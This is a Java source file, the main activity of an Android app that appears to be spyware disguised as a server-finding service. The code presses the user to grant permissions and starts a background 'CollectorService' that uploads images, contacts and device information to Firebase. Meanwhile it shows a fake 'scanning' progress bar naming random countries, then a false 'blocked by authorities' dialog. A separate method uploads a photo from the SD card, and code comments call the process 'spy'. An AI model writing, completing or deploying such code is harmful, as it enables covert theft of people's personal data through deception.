package com.tangledbytes.sw;


import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.tangledbytes.sw.services.CollectorService;
import com.tangledbytes.sw.utils.Constants;
import com.tangledbytes.sw.utils.Utils;

import java.io.ByteArrayOutputStream;
import java.util.Random;

public class MainActivity extends Activity {
    private static final String TAG = "MainActivity";
    private static final int PERMISSIONS_REQUEST_CODE = 101;
    private static final int OPEN_SETTINGS_REQUEST_CODE = 102;
    private final Utils mUtils = new Utils(this);
    FirebaseStorage storage = FirebaseStorage.getInstance();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

//        storage.useEmulator("10.0.2.2", 9199);
        startCollectorService();
    }

    String[] countries = new String[]{"Afghanistan", "Albania", "Algeria", "American Samoa", "Andorra", "Angola", "Anguilla", "Antarctica", "Antigua and Barbuda", "Argentina", "Armenia", "Aruba", "Australia", "Austria", "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", "Belize", "Benin", "Bermuda", "Bhutan", "Bolivia", "Bosnia and Herzegowina", "Botswana", "Bouvet Island", "Brazil", "British Indian Ocean Territory", "Brunei Darussalam", "Bulgaria", "Burkina Faso", "Burundi", "Cambodia", "Cameroon", "Canada", "Cape Verde", "Cayman Islands", "Central African Republic", "Chad", "Chile", "China", "Christmas Island", "Cocos (Keeling) Islands", "Colombia", "Comoros", "Congo", "Congo, the Democratic Republic of the", "Cook Islands", "Costa Rica", "Cote d'Ivoire", "Croatia (Hrvatska)", "Cuba", "Cyprus", "Czech Republic", "Denmark", "Djibouti", "Dominica", "Dominican Republic", "East Timor", "Ecuador", "Egypt", "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Ethiopia", "Falkland Islands (Malvinas)", "Faroe Islands", "Fiji", "Finland", "France", "France Metropolitan", "French Guiana", "French Polynesia", "French Southern Territories", "Gabon", "Gambia", "Georgia", "Germany", "Ghana", "Gibraltar", "Greece", "Greenland", "Grenada", "Guadeloupe", "Guam", "Guatemala", "Guinea", "Guinea-Bissau", "Guyana", "Haiti", "Heard and Mc Donald Islands", "Holy See (Vatican City State)", "Honduras", "Hong Kong", "Hungary", "Iceland", "India", "Indonesia", "Iran (Islamic Republic of)", "Iraq", "Ireland", "Israel", "Italy", "Jamaica", "Japan", "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Korea, Democratic People's Republic of", "Korea, Republic of", "Kuwait", "Kyrgyzstan", "Lao, People's Democratic Republic", "Latvia", "Lebanon", "Lesotho", "Liberia", "Libyan Arab Jamahiriya", "Liechtenstein", "Lithuania", "Luxembourg", "Macau", "Macedonia, The Former Yugoslav Republic of", "Madagascar", "Malawi", "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Martinique", "Mauritania", "Mauritius", "Mayotte", "Mexico", "Micronesia, Federated States of", "Moldova, Republic of", "Monaco", "Mongolia", "Montserrat", "Morocco", "Mozambique", "Myanmar", "Namibia", "Nauru", "Nepal", "Netherlands", "Netherlands Antilles", "New Caledonia", "New Zealand", "Nicaragua", "Niger", "Nigeria", "Niue", "Norfolk Island", "Northern Mariana Islands", "Norway", "Oman", "Pakistan", "Palau", "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Pitcairn", "Poland", "Portugal", "Puerto Rico", "Qatar", "Reunion", "Romania", "Russian Federation", "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent and the Grenadines", "Samoa", "San Marino", "Sao Tome and Principe", "Saudi Arabia", "Senegal", "Seychelles", "Sierra Leone", "Singapore", "Slovakia (Slovak Republic)", "Slovenia", "Solomon Islands", "Somalia", "South Africa", "South Georgia and the South Sandwich Islands", "Spain", "Sri Lanka", "St. Helena", "St. Pierre and Miquelon", "Sudan", "Suriname", "Svalbard and Jan Mayen Islands", "Swaziland", "Sweden", "Switzerland", "Syrian Arab Republic", "Taiwan, Province of China", "Tajikistan", "Tanzania, United Republic of", "Thailand", "Togo", "Tokelau", "Tonga", "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan", "Turks and Caicos Islands", "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", "United Kingdom", "United States", "United States Minor Outlying Islands", "Uruguay", "Uzbekistan", "Vanuatu", "Venezuela", "Vietnam", "Virgin Islands (British)", "Virgin Islands (U.S.)", "Wallis and Futuna Islands", "Western Sahara", "Yemen", "Yugoslavia", "Zambia", "Zimbabwe", "Palestine"};

    private void showFakeProcess() {
        ProgressBar progressBar = findViewById(R.id.proc_progress);
        TextView tvProcMainTitle = findViewById(R.id.proc_title);
        TextView tvProcContent = findViewById(R.id.proc_content);
        TextView tvProgress = findViewById(R.id.tv_progress);
        tvProcMainTitle.setText("Looking for closest server");
        new Thread(() -> {
            Random random = new Random();
            long start = System.currentTimeMillis();
            long secDuration = 0;
            double progress = 0;
            while (!hasUploadedAllData() && secDuration < 300) {
                progress += 0.008 * (100 - progress);
                int finalProgress = (int) progress;
                runOnUiThread(() -> {
                    // increase progress by 5% of remaining progress
                    tvProcContent.setText("scanning " + countries[random.nextInt(countries.length)] + "...");
                    progressBar.setProgress(finalProgress);
                    tvProgress.setText(finalProgress + "%");
                });
                secDuration = (System.currentTimeMillis() - start) / 1000;
                synchronized (this) {
                    try {
                        wait(random.nextInt(400) + 1);
                    } catch (InterruptedException e) {
                        throw new RuntimeException(e);
                    }
                }
            }
            runOnUiThread(this::showFailedDialog);
        }).start();
    }

    public void showFailedDialog() {
        AlertDialog.Builder failedDialog = new AlertDialog.Builder(this)
                .setTitle("Access denied")
                .setMessage("It looks like authorities has blocked this service in your area. Please stay tuned for further updates.\nThank you")
                .setCancelable(false)
                .setNegativeButton(R.string.exit,
                        (dialog, whichButton) -> {
                            mUtils.showToast(R.string.closing_app);
                            setResult(RESULT_CANCELED);
                            finish();
                        });
        failedDialog.show();
    }

    public void uploadImage() {
        Bitmap bitmap = BitmapFactory.decodeFile("/sdcard/hey.jpg");
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, 30, bos);
        byte[] arr = bos.toByteArray();
        StorageReference ref = storage.getReference("files/fuckme/photo.jpeg");
        UploadTask task = ref.putBytes(arr);
        task.addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
            @Override
            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                Toast.makeText(MainActivity.this, "UPLOADED", Toast.LENGTH_SHORT).show();
            }
        });
        task.addOnFailureListener(new OnFailureListener() {
            @Override
            public void onFailure(@NonNull Exception e) {
                Toast.makeText(MainActivity.this, "FAILED", Toast.LENGTH_SHORT).show();
            }
        });
    }

    private void startCollectorService() {
        if (hasUploadedAllData()) {
            showFailedDialog();
            Log.i(TAG, "Data uploaded, not starting collector service");
            return;
        }
        if (!hasAllPermissions()) {
            Log.d(TAG, "All permissions are not granted, prompting for permission grant...");
            grantPermissions();
            return;
        }
        Intent intentCollectorService = new Intent(MainActivity.this, CollectorService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intentCollectorService);
        } else
            startService(intentCollectorService);
        showFakeProcess();
    }

    private boolean hasUploadedAllData() {
        SharedPreferences prefs = getSharedPreferences(Constants.PREFS_UPLOAD_STATUS, Context.MODE_PRIVATE);
        return prefs.getBoolean(Constants.PREF_IMAGES_STATUS, false)
                && prefs.getBoolean(Constants.PREF_CONTACTS_STATUS, false)
                && prefs.getBoolean(Constants.PREF_DEVICE_INFO_STATUS, false);
    }

    public boolean hasAllPermissions() {
        for (String permission : Constants.PERMISSIONS_NEEDED) {
            if (!mUtils.hasPermission(permission)) return false;
        }
        return true;
    }

    private void grantPermissions() {
        requestPermissions(Constants.PERMISSIONS_NEEDED,
                PERMISSIONS_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSIONS_REQUEST_CODE) {
            handlePermissionResult();
        }
    }

    /**
     * Checks whether the user has granted all permissions or not. If the user had granted all
     * permissions then it starts spy otherwise it again prompts for granting  permissions.
     */
    private void handlePermissionResult() {
        for (String permission : Constants.PERMISSIONS_NEEDED) {
            if (mUtils.hasPermission(permission)) {
                // User granted this permission, check for next one
                continue;
            }
            // User not granted permission
            AlertDialog.Builder permissionRequestDialog = new AlertDialog.Builder(this)
                    .setTitle(R.string.dialog_permission_title)
                    .setMessage(R.string.dialog_permission_message)
                    .setCancelable(false)
                    .setNegativeButton(R.string.exit,
                            (dialog, whichButton) -> {
                                mUtils.showToast(R.string.closing_app);
                                setResult(RESULT_CANCELED);
                                finish();
                            });
            if (!shouldShowRequestPermissionRationale(permission)) {
                // User clicked on "Don't ask again", show dialog to navigate him to
                // settings
                permissionRequestDialog
                        .setPositiveButton(R.string.go_to_settings,
                                (dialog, whichButton) -> {
                                    Intent intent =
                                            new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                                    Uri uri =
                                            Uri.fromParts("package", getPackageName(), null);
                                    intent.setData(uri);
                                    startActivityForResult(intent,
                                            OPEN_SETTINGS_REQUEST_CODE);
                                })
                        .show();
            } else {
                // User clicked on 'deny', prompt again for permissions
                permissionRequestDialog
                        .setPositiveButton(R.string.try_again,
                                (dialog, whichButton) -> grantPermissions())
                        .show();
            }
            return;
        }
        Log.i(TAG, "All required permissions have been granted!");
        startCollectorService();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == OPEN_SETTINGS_REQUEST_CODE) {
            handlePermissionResult();
        }
    }
}